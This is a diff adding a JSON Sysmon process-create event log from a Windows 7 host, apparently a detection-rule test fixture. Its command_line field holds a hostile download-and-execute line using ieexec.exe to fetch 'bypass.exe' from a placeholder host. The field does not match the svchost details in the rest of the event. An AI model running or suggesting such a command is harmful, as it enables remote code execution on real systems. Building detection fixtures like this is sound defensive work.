@@ -1,0 +1,136 @@
+{
+  "@timestamp": "2021-02-04T22:27:15.625Z",
+  "message": "Process Create:\nRuleName: \nUtcTime: 2021-02-04 22:27:15.625\nProcessGuid: {19FC45AC-74C3-601C-0000-0010E1790000}\nProcessId: 552\nImage: C:\\Windows\\System32\\svchost.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Host Process for Windows Services\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: svchost.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k DcomLaunch\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {19FC45AC-74C3-601C-0000-0020E7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: MD5=54A47F6B5E09A77E61649109C6A08866,SHA256=121118A0F5E0E8C933EFD28C9901E54E42792619A8A3A6D11E1F0025A7324BC2\nParentProcessGuid: {19FC45AC-74C2-601C-0000-001050630000}\nParentProcessId: 440\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe",
+  "process": {
+    "command_line": "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\ieexec.exe http://x.x.x.x:8080/bypass.exe",
+    "working_directory": "C:\\Windows\\system32\\",
+    "args": [
+      "C:\\Windows\\system32\\svchost.exe",
+      "-k",
+      "DcomLaunch"
+    ],
+    "hash": {
+      "md5": "54a47f6b5e09a77e61649109c6a08866",
+      "sha256": "121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2"
+    },
+    "entity_id": "{19FC45AC-74C3-601C-0000-0010E1790000}",
+    "pid": 552,
+    "executable": "C:\\Windows\\System32\\svchost.exe",
+    "parent": {
+      "entity_id": "{19FC45AC-74C2-601C-0000-001050630000}",
+      "pid": 440,
+      "executable": "C:\\Windows\\System32\\services.exe",
+      "command_line": "C:\\Windows\\system32\\services.exe",
+      "name": "services.exe",
+      "args": [
+        "C:\\Windows\\system32\\services.exe"
+      ]
+    },
+    "name": "svchost.exe"
+  },
+  "agent": {
+    "ephemeral_id": "805d2621-88bc-4353-a953-25544d012426",
+    "id": "c58de8d4-8be2-444c-bc20-92fab97cbaf5",
+    "name": "CLIENT2",
+    "type": "winlogbeat",
+    "version": "7.10.2",
+    "hostname": "CLIENT2"
+  },
+  "event": {
+    "code": 1,
+    "provider": "Microsoft-Windows-Sysmon",
+    "action": "Process Create (rule: ProcessCreate)",
+    "created": "2021-02-04T22:31:11.344Z",
+    "kind": "event",
+    "module": "sysmon",
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start",
+      "process_start"
+    ]
+  },
+  "log": {
+    "level": "information"
+  },
+  "winlog": {
+    "user": {
+      "domain": "NT AUTHORITY",
+      "type": "User",
+      "identifier": "S-1-5-18",
+      "name": "SYSTEM"
+    },
+    "event_id": 1,
+    "record_id": 1163,
+    "api": "wineventlog",
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "task": "Process Create (rule: ProcessCreate)",
+    "opcode": "Info",
+    "process": {
+      "thread": {
+        "id": 1392
+      },
+      "pid": 1896
+    },
+    "version": 5,
+    "event_data": {
+      "Description": "Host Process for Windows Services",
+      "LogonGuid": "{19FC45AC-74C3-601C-0000-0020E7030000}",
+      "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "svchost.exe",
+      "IntegrityLevel": "System",
+      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
+      "TerminalSessionId": "0",
+      "LogonId": "0x3e7"
+    },
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "computer_name": "CLIENT",
+    "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+  },
+  "user": {
+    "domain": "NT AUTHORITY",
+    "name": "SYSTEM"
+  },
+  "related": {
+    "hash": [
+      "54a47f6b5e09a77e61649109c6a08866",
+      "121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2"
+    ],
+    "user": "SYSTEM"
+  },
+  "hash": {
+    "sha256": "121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2",
+    "md5": "54a47f6b5e09a77e61649109c6a08866"
+  },
+  "ecs": {
+    "version": "1.5.0"
+  },
+  "host": {
+    "architecture": "x86",
+    "os": {
+      "build": "7601.0",
+      "platform": "windows",
+      "version": "6.1",
+      "family": "windows",
+      "name": "Windows 7 Professional",
+      "kernel": "6.1.7601.18741 (win7sp1_gdr.150202-1526)"
+    },
+    "id": "19fc45ac-5890-4f96-81b1-50ed111c0ce4",
+    "ip": [
+      "192.168.56.102",
+      "172.16.1.2",
+      "fe80::5efe:c0a8:3866",
+      "fe80::5efe:ac10:102"
+    ],
+    "mac": [
+      "00:50:56:00:03:02",
+      "00:50:56:00:00:02",
+      "00:00:00:00:00:00:00:e0",
+      "00:00:00:00:00:00:00:e0"
+    ],
+    "hostname": "CLIENT2",
+    "name": "CLIENT"
+  }
+}
